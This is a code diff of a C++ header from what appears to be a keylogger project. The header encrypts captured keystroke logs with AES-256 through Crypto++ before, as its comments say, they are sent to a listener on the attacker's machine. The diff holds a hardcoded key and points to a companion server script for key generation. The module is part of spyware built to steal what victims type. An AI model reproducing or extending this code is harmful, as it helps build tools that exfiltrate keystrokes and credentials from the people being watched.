@@ -10,37 +10,58 @@
 #include "osrng.h"
 #include "hex.h"
 
+/*
+
+This header file will include the functionality used to encrypt data after it is
+collected but before it is sent to the attacker's listener
+
+*/
+
 namespace Transformer
 {
-	//AES Encryption Groundwork | AES-256 keys will be used
 
-	//This key must be changed before each deployment
-	std::string keyStr = "6E5A7234743777217A25432A462D4A614E645267556B58703273357638782F41";
+	// This key must be changed with the output of "python3 toms-server.py --mode keygen" before each deployment
+	
+	std::string keyStr = "5367566B5970337336763979244226452948404D6351655468576D5A71347437";
 
+	// AES groundwork for keys, ivs, and random numbers
+	
 	static constexpr size_t AES_KEY_SIZE = 256 / 8;
+	
 	std::vector<uint8_t> key(AES_KEY_SIZE);	
-
 	std::vector<uint8_t> iv(CryptoPP::AES::BLOCKSIZE);
 	
 	CryptoPP::AutoSeededRandomPool randNumGen;
+	
+	// Method prototypes for ease of understanding
 
+	std::string aesEncrypt(std::string plainText);
+	std::string byteArrayToHexString(std::vector<uint8_t> &vector);
 	std::vector<uint8_t> hexStringToByteArray(std::string hex);
+	std::string getIV();
 
-	/* The functions below will make use of the publicly available Crypto++ library
-	to encrypt the strings that make it to the key log file and return the keys/ivs.
+	/* 
+	
+	The aesEncrypt function will make use of the publicly available Crypto++ library
+	to encrypt the keylog data that will be sent to the listener running on the attacker machine
 
 	Instructions: 
 	
 	Compilation/Linking -> https://www.ired.team/miscellaneous-reversing-forensics/aes-encryption-example-using-cryptopp-.lib-in-visual-studio-c++ 
+	
 	Encryption/Decryption -> https://petanode.com/posts/brief-introduction-to-cryptopp/
-	Key/IV Retrieval -> https://www.cryptopp.com/wiki/HMAC
+	
+	Hex/Byte Conversion -> 
+	
+	https://www.cryptopp.com/wiki/HMAC
+	https://stackoverflow.com/questions/17261798/converting-a-hex-string-to-a-byte-array
 
 	*/
 
 	std::string aesEncrypt(std::string plainText)
 	{
-		//Can't securley transfer decryption key, so I will just make the user preset it b4 compilation
-		//randNumGen.GenerateBlock(key.data(), key.size());
+		// Can't securley transfer AES key, so I will just make the user preset it b4 compilation
+		// randNumGen.GenerateBlock(key.data(), key.size());
 		
 		randNumGen.GenerateBlock(iv.data(), iv.size());
 		key = hexStringToByteArray(keyStr);
@@ -73,32 +94,26 @@ namespace Transformer
 
 		return hexEncoded;
 	}
-	
-	std::string getEncryptionKey()
+
+	std::vector<uint8_t> hexStringToByteArray(std::string hex)
 	{
-		return keyStr;
+		std::vector<uint8_t> byteArray;
+
+		for (unsigned int i = 0; i < hex.length(); i += 2) {
+			std::string byteString = hex.substr(i, 2);
+			char byte = (char)strtol(byteString.c_str(), NULL, 16);
+			byteArray.push_back(byte);
+		}
+
+		return byteArray;
+
 	}
-	
+
 	std::string getIV()
 	{
 		return byteArrayToHexString(iv);
 	}
 
-	//Source: https://stackoverflow.com/questions/17261798/converting-a-hex-string-to-a-byte-array
-
-	std::vector<uint8_t> hexStringToByteArray(std::string hex)
-	{
-			std::vector<uint8_t> byteArray;
-
-			for (unsigned int i = 0; i < hex.length(); i += 2) {
-				std::string byteString = hex.substr(i, 2);
-				char byte = (char)strtol(byteString.c_str(), NULL, 16);
-				byteArray.push_back(byte);
-			}
-
-			return byteArray;
-		
-	}
 }
 
 #endif // !TRANSFORMER_H
